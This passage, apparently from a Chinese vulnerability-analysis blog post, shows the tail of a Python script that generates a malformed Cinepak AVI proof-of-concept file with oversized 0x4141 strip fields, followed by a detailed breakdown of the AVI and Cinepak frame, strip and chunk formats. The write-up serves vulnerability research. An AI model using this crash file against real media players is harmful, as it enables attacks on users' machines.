class="string">"\x00"</span>           <span class="comment"># Flags &lt;-------------------+                           |   ; Flags = 0x0</span></span><br><span class="line">                  <span class="string">"\x00\x00\x68"</span>            <span class="comment"># Length of CVID data       |                           |   ; Length of CVID data = 0x68 = 104</span></span><br><span class="line">                  <span class="string">"\x01\x60"</span>                <span class="comment"># Width of coded frame "Frame Header"                   |   ; Width of coded frame = 0x160 = 352</span></span><br><span class="line">                  <span class="string">"\x01\x20"</span>)               <span class="comment"># Height of coded frame     |                           |   ; Height of coded frame = 0x120 = 288</span></span><br><span class="line">    number_of_coded_strips = (<span class="string">"\x00\x10"</span>)   <span class="comment"># Number of coded strips &lt;--+                           |   ; number_of_coded_strips = 0x10 = 16</span></span><br><span class="line">    cinepak_codec_data2 = (<span class="string">"\x10\x00"</span>       <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1000 - Intra-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                <span class="comment"># Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x0</span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x0</span></span><br><span class="line">                  <span class="string">"\x00\x60"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x60 = 96</span></span><br><span class="line">                  <span class="string">"\x01\x60"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x160 = 352</span></span><br><span class="line">                  <span class="string">"\x20\x00"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x2000 - List of blocks in 12 bit V4 codebook</span></span><br><span class="line">                  <span class="string">"\x00\x00"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x0</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top Y position "Strip Header"               "movi" ; Strips top Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data        |                           |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top Y position "Strip Header"                  |   ; Strips top Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips top X position     |                           |   ; Strips top X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom Y position  |                           |   ; Strips bottom Y position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Strips bottom X position&lt;-+                           |   ; Strips bottom X position = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># CVID Chunk ID &lt;-----------+ "CVID Chunk"              |   ; CVID Chunk ID = 0x4141</span></span><br><span class="line">                  <span class="string">"\x41\x41"</span>                <span class="comment"># Size of chunk data(N) &lt;---+                           |   ; Size of chunk data = 0x4141</span></span><br><span class="line">                  <span class="string">"\x11\x00"</span>                <span class="comment"># Strip CVID ID &lt;-----------+                           |   ; Strip CVID ID = 0x1100 - Inter-coded strip</span></span><br><span class="line">                  <span class="string">"\x00\x10"</span>                <span class="comment"># Size of strip data    "Strip Header"                  |   ; Size of strip data = 0x10 = 16</span></span><br><span class="line">                  <span class="string">"\x41\x00"</span>)               <span class="comment"># Strips top Y position&lt;----+---------------------------+   ; Strips top Y position = 0x4141</span></span><br><span class="line">    </span><br><span class="line">    idx_tag =    (<span class="string">"\x69\x64\x78\x31"</span>    <span class="comment"># dwFourCC = "idx1" &lt;-----------+   </span></span><br><span class="line">                  <span class="string">"\x10\x00\x00\x00"</span>    <span class="comment"># dwSize = 0x10 = 16 byte       |   </span></span><br><span class="line">                  <span class="string">"\x30\x30\x64\x63"</span>        <span class="comment"># dwChunkId = "00dc"     "idx1" </span></span><br><span class="line">                  <span class="string">"\x10\x00\x00\x00"</span>        <span class="comment"># dwFlags = 0x10            |   </span></span><br><span class="line">                  <span class="string">"\x04\x00\x00\x00"</span>        <span class="comment"># dwOffset = 0x4            |   </span></span><br><span class="line">                  <span class="string">"\x68\x00\x00\x00"</span>)       <span class="comment"># dwSize = 0x68 &lt;-----------+   </span></span><br><span class="line">    </span><br><span class="line">    avifile = open(<span class="string">'poc3.avi'</span>, <span class="string">'wb+'</span>)</span><br><span class="line">    avifile.write(aviHeaders)</span><br><span class="line">    avifile.write(padding)</span><br><span class="line">    avifile.write(movi_tag)</span><br><span class="line">    avifile.write(cinepak_codec_data1)</span><br><span class="line">    avifile.write(number_of_coded_strips)</span><br><span class="line">    avifile.write(cinepak_codec_data2)</span><br><span class="line">    avifile.write(idx_tag)</span><br><span class="line">    </span><br><span class="line">    avifile.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-AVI文件格式"><a href="#0x31-AVI文件格式" class="headerlink" title="0x31 AVI文件格式"></a>0x31 AVI文件格式</h3><p>&emsp;&emsp;<code>AVI文件格式</code>的细节，可以看我写的另一篇文章<code>《AVI文件格式分析》</code>。</p>
<h3 id="0x32-Cinepak视频编解码器"><a href="#0x32-Cinepak视频编解码器" class="headerlink" title="0x32 Cinepak视频编解码器"></a>0x32 Cinepak视频编解码器</h3><p>&emsp;&emsp;<code>Cinepak编解码器</code>是一种相对<code>较旧的</code>编码技术，今天仍然<code>很少使用</code>。它的<code>优势</code>来自<code>解码器的计算简单</code>，而不是<code>比特率与质量性能</code>之间的关系。这个<code>编解码器</code>基本上是一个具有<code>自适应向量密度</code>的<code>向量量化器</code>。<code>每个帧</code>被分割为<code>4x4像素块</code>，并且<code>每个块</code>使用<code>1或4个向量</code>进行编码。我们将这些<code>编码类型</code>标记如下：</p>
<blockquote>
<ul>
<li><strong><code>V1</code></strong> - 每个块(block)用<code>1个向量</code>编码。</li>
<li><strong><code>V4</code></strong> - 每个块(block)用<code>4个向量</code>编码。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;<code>V1</code>和<code>V4</code>编码类型都引用<code>单独的向量codebooks</code>，我们分别将其标记为<code>V1 codebooks</code>和<code>V4 codebooks</code>。<code>每个codebooks</code>最多包含<code>256个条目</code>。</p>
<p>&emsp;&emsp;<code>Frame</code>也被分成可变大小的<code>条(Strips)</code>。<code>条(Strips)</code>定义了<code>Frame</code>的区域大小，<code>该区域的尺寸</code>小于或等于<code>Frame的尺寸</code>。<code>每个条(Strips)</code>定义其自己的<code>一对</code>独特的<code>向量codebooks</code>。</p>
<p>&emsp;&emsp;一个<code>Frame</code>可以使用<code>每像素8位</code>(bpp)或<code>每像素12位</code>编码。在<code>12bpp模式</code>下，每个<code>codebooks向量</code>包含<code>4个8位亮度值</code>(luminance)和<code>2个子采样的8位色度值</code>(chrominance)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">   +----+----+  +---+  +---+</span><br><span class="line">   | y0 | y1 |  | u |  | v |</span><br><span class="line">   +----+----+  +---+  +---+</span><br><span class="line">   | y2 | y3 |</span><br><span class="line">   +----+----+</span><br><span class="line">----------------------------------------------------------------------------------------------</span><br><span class="line">    YUV444(4x4 pixel blocks)                        YUV422(4x4 pixel blocks)</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V |                       | U   |   V | U   |   V |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V | 4*4*3=48byte          | U   |   V | U   |   V | 4*4*2=32byte</span><br><span class="line">    +-----+-----+-----+-----+ (48*8)/16=24bpp       +-----+-----+-----+-----+ (32*8)/16=16bpp</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V |                       | U   |   V | U   |   V |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U V | U V | U V | U V |                       | U   |   V | U   |   V |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line"></span><br><span class="line">    YUV420(4x4 pixel blocks)                        Y(4x4 pixel blocks)</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U   |     | U   |     |                       |     |     |     |     |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    |     |   V |     |   V | 4*(4+1+1)=24byte      |     |     |     |     | 4*4*1=16byte</span><br><span class="line">    +-----+-----+-----+-----+ (24*8)/16=12bpp       +-----+-----+-----+-----+ (16*8)/16=8bpp</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    | U   |     | U   |     |                       |     |     |     |     |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       |  Y  |  Y  |  Y  |  Y  |</span><br><span class="line">    |     |   V |     |   V |                       |     |     |     |     |</span><br><span class="line">    +-----+-----+-----+-----+                       +-----+-----+-----+-----+</span><br><span class="line"></span><br><span class="line">    YUV411(4x4 pixel blocks)                        </span><br><span class="line">    +-----+-----+-----+-----+                       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    | U   |     |   V |     |                       </span><br><span class="line">    +-----+-----+-----+-----+                       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    |     | U   |     |   V | 4*(4+1+1)=24byte          </span><br><span class="line">    +-----+-----+-----+-----+ (24*8)/16=12bpp       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    | U   |     |   V |     |                       </span><br><span class="line">    +-----+-----+-----+-----+                       </span><br><span class="line">    |  Y  |  Y  |  Y  |  Y  |                       </span><br><span class="line">    |     | U   |     |   V |                       </span><br><span class="line">    +-----+-----+-----+-----+</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;在<code>8bpp模式</code>下，<code>codebooks</code>仅包含<code>4个亮度值</code>(luminance)。使用以下简单的<code>矩阵乘法</code>可实现从<code>RGB颜色空间</code>到<code>Cinepak颜色空间</code>的转换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| r |   | 1.0  0.0  2.0 | | y |</span><br><span class="line">| g | = | 1.0 -0.5 -1.0 | | u |</span><br><span class="line">| b |   | 1.0  2.0  0.0 | | v |</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;求3x3矩阵的<code>逆矩阵</code>可以得出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| y |   |  0.2857  0.5714  0.1429 | | r |</span><br><span class="line">| u | = | -0.1429 -0.2857  0.4286 | | g |</span><br><span class="line">| v |   |  0.3571 -0.2857 -0.0714 | | b |</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这显然不同于用于<code>颜色空间转换</code>的<code>标准技术</code>，并且之所以选择它是因为它的<code>数学简单性</code>而不是其<code>感知性能</code>。</p>
<p>&emsp;&emsp;如前所述，可以使用<code>标记为V1</code>的<code>1个8位向量</code>或<code>标记为V4</code>的<code>4个8位向量</code>来对<code>4×4像素块</code>进行编码。这些<code>向量</code>分别引用<code>V1</code>和<code>V4 codebooks</code>。对于<code>V1编码的块</code>，使用<code>单个codebook向量</code>对块进行编码，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+----+----+----+----+  +---+---+  +---+---+</span><br><span class="line">| y0 | y0 | y1 | y1 |  | u | u |  | v | v |</span><br><span class="line">+----+----+----+----+  +---+---+  +---+---+</span><br><span class="line">| y0 | y0 | y1 | y1 |  | u | u |  | v | v |</span><br><span class="line">+----+----+----+----+  +---+---+  +---+---+</span><br><span class="line">| y2 | y2 | y3 | y3 |</span><br><span class="line">+----+----+----+----+</span><br><span class="line">| y2 | y2 | y3 | y3 |</span><br><span class="line">+----+----+----+----+</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;对于<code>V4编码的块</code>，使用<code>4个codebook表条目</code>对块进行编码。应用于<code>块(block)</code>的<code>4向量参考(r0, r1, r2, r3)</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------+------+------+------+  +-----+-----+  +-----+-----+</span><br><span class="line">| r0y0 | r0y1 | r1y0 | r1y1 |  | r0u | r1u |  | r0v | r1v |</span><br><span class="line">+------+------+------+------+  +-----+-----+  +-----+-----+</span><br><span class="line">| r0y2 | r0y3 | r1y2 | r1y3 |  | r2u | r3u |  | r2v | r3v |</span><br><span class="line">+------+------+------+------+  +-----+-----+  +-----+-----+</span><br><span class="line">| r2y0 | r2y1 | r3y0 | r3y1 |</span><br><span class="line">+------+------+------+------+</span><br><span class="line">| r2y2 | r2y3 | r3y2 | r3y3 |</span><br><span class="line">+------+------+------+------+</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>Cinepak</code>视频序列的<code>典型Frame</code>由以下部分组成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">| Frame Header          |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 1 Header        |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 1 Codebooks     |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 1 Frame Vectors |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 2 Header        |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 2 Codebooks     |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 2 Frame Vectors |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Strip 3 Header        |</span><br><span class="line">+-----------------------+</span><br><span class="line">|    .      .      .    |</span><br><span class="line">|    .      .      .    |</span><br><span class="line">|    .      .      .    |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>这些部分</code>中的每一个都有更详细的描述。所有<code>多字节值</code>均以<code>最高有效字节顺序(MSB)</code>排序(即：摩托罗拉顺序,大端)。因此，<code>字节交换</code>需要基于<code>Intel处理器</code>的机器。</p>
<h4 id="1、Frame-Header"><a href="#1、Frame-Header" class="headerlink" title="1、Frame Header"></a>1、Frame Header</h4><p>&emsp;&emsp;<code>Cinepak</code>视频序列的<code>每一帧(Frame)</code>都以一个<code>Header</code>开头，其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |             | |       Flags                         Byte</span><br><span class="line">   +---------------+</span><br><span class="line">1  |               |       Length of CVID data           Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">2  |               |</span><br><span class="line">   +-             -+</span><br><span class="line">3  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">4  |               |       Width of coded frame          Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">5  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">6  |               |       Height of coded frame         Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">7  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">8  |               |       Number of coded strips        Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">9  |               |</span><br><span class="line">   +---------------+</span><br></pre></td></tr></table></figure></p>
<blockquote>
<ul>
<li><strong><code>Flags</code></strong> - Flags字段的<code>位0</code>指定<code>每个条(Strip)</code>的<code>codebooks</code>是否使用<code>上一个条(Strip)</code>中定义的<code>codebooks</code>。对于Frame的<code>第一个Strip</code>，<code>先前的Strip</code>可以在<code>先前的Frame</code>中找到。</li>
<li><strong><code>Length</code></strong> - 此字段指定Frame中的<code>字节总数</code>。</li>
<li><strong><code>Width</code></strong> - Frame的<code>像素宽度</code>。</li>
<li><strong><code>Height</code></strong> - Frame的<code>像素高度</code>。</li>
<li><strong><code>Number of Strips</code></strong> - 用于对Frame进行编码的<code>条(Strips)总数</code>。</li>
</ul>
</blockquote>
<h4 id="2、Strip-Header"><a href="#2、Strip-Header" class="headerlink" title="2、Strip Header"></a>2、Strip Header</h4><p>&emsp;&emsp;<code>帧(Frame)</code>的<code>条(Strips)总数</code>在<code>Frame Header</code>中定义。<code>每个条(Strips)</code>都以<code>Strip Header</code>开始，其定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">     7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">    +---------------+</span><br><span class="line"> 0  |               |       Strip CVID ID                 Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 1  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 2  |               |       Size of strip data            Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 3  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 4  |               |       Strips top Y position         Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 5  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 6  |               |       Strips top X position         Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 7  |               |</span><br><span class="line">    +---------------+</span><br><span class="line"> 8  |               |       Strips bottom Y position      Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line"> 9  |               |</span><br><span class="line">    +---------------+</span><br><span class="line">10  |               |       Strips bottom X position      Unsigned</span><br><span class="line">    +-             -+</span><br><span class="line">11  |               |</span><br><span class="line">    +---------------+</span><br></pre></td></tr></table></figure></p>
<blockquote>
<ul>
<li><strong><code>Strip ID</code></strong> - 此ID具有以下两个值之一：<ul>
<li><strong><code>0x1000</code></strong> - Intra-coded strip</li>
<li><strong><code>0x1100</code></strong> - Inter-coded strip</li>
</ul>
</li>
<li><strong><code>Size</code></strong> - 用于编码Strip的<code>字节总数</code>。这包括用于<code>codebook定义</code>和<code>编码向量</code>的字节。</li>
<li><strong><code>Strips X and Y positions</code></strong> - 这4个值定义了<code>条(Strip)</code>所定义的<code>帧(Frame)的区域</code>。</li>
</ul>
</blockquote>
<h4 id="3、CVID-Chunk"><a href="#3、CVID-Chunk" class="headerlink" title="3、CVID Chunk"></a>3、CVID Chunk</h4><p>&emsp;&emsp;在<code>Strip Header</code>之后，<code>每个条(Strip)</code>由一系列<code>块(Chunk)</code>组成，其结构如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |               |       CVID Chunk ID                 Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">1  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">2  |               |       Size of chunk data (N)        Unsigned</span><br><span class="line">   +-             -+</span><br><span class="line">3  |               |</span><br><span class="line">   +---------------+</span><br><span class="line">4  |               |</span><br><span class="line">   +-             -+</span><br><span class="line">5  |               |</span><br><span class="line">   +-   . . . .   -+       Chunk data (N - 4 bytes)      Byte</span><br><span class="line">   |               |</span><br><span class="line">   +-             -+</span><br><span class="line">N  |               |</span><br><span class="line">   +---------------+</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>块(Chunk)</code>以<code>标识号</code>开头，然后是<code>块中的字节数</code>。有几种<code>块类型</code>，列出如下：</p>
<blockquote>
<ul>
<li><strong><code>CVID Chunk ID</code></strong> - <ul>
<li><strong><code>Intra-coded frames</code></strong>:<ul>
<li><strong><code>0x2000</code></strong> - 12位V4 codebook中的块列表</li>
<li><strong><code>0x2200</code></strong> - 12位V1 codebook中的块列表</li>
<li><strong><code>0x2400</code></strong> - 8位V4 codebook中的块列表</li>
<li><strong><code>0x2600</code></strong> - 8位V1 codebook中的块列表</li>
<li><strong><code>0x3000</code></strong> - 用于编码Frame的向量</li>
<li><strong><code>0x3200</code></strong> - 仅来自V1 codebook的块列表</li>
</ul>
</li>
<li><strong><code>Inter-coded frames</code></strong>:<ul>
<li><strong><code>0x2100</code></strong> - 更新12位V4 codebook的可选块列表</li>
<li><strong><code>0x2300</code></strong> - 更新12位V1 codebook的可选块列表</li>
<li><strong><code>0x2500</code></strong> - 更新8位V4 codebook的可选块列表</li>
<li><strong><code>0x2700</code></strong> - 更新8位V1 codebook的可选块列表</li>
<li><strong><code>0x3100</code></strong> - 用于编码一个Frame的向量的选择性集合</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p>&emsp;&emsp;在<code>Chunk ID</code>和<code>Size</code>之后是<code>块数据</code>。该数据的格式取决于<code>Chunk ID</code>。这些将在以下各节中介绍。</p>
<h4 id="4、Intra-list-of-codebook-blocks-IDs-0x2000-0x2200-0x2400-0x2600"><a href="#4、Intra-list-of-codebook-blocks-IDs-0x2000-0x2200-0x2400-0x2600" class="headerlink" title="4、Intra list of codebook blocks(IDs 0x2000, 0x2200, 0x2400, 0x2600)"></a>4、Intra list of codebook blocks(IDs 0x2000, 0x2200, 0x2400, 0x2600)</h4><p>&emsp;&emsp;该<code>Chunk</code>是包含<code>codebook条目</code>的列表。<code>每个字节</code>代表一个<code>颜色分量值</code>。在<code>12bpp模式</code>(<code>0x2000</code>和<code>0x2200</code>)中，<code>每6个字节</code>代表一个<code>codebook条目</code>，从<code>向量0</code>开始：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |               |       Luminance value 0             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">1  |               |       Luminance value 1             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">2  |               |       Luminance value 2             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">3  |               |       Luminance value 3             Byte</span><br><span class="line">   +---------------+</span><br><span class="line">4  |               |       U Chrominance value           Byte</span><br><span class="line">   +---------------+</span><br><span class="line">5  |               |       V Chrominance value           Byte</span><br><span class="line">   +---------------+</span><br><span class="line">6  |       .       |</span><br><span class="line">           .</span><br><span class="line">           .</span><br></pre></td></tr></table></figure></p>
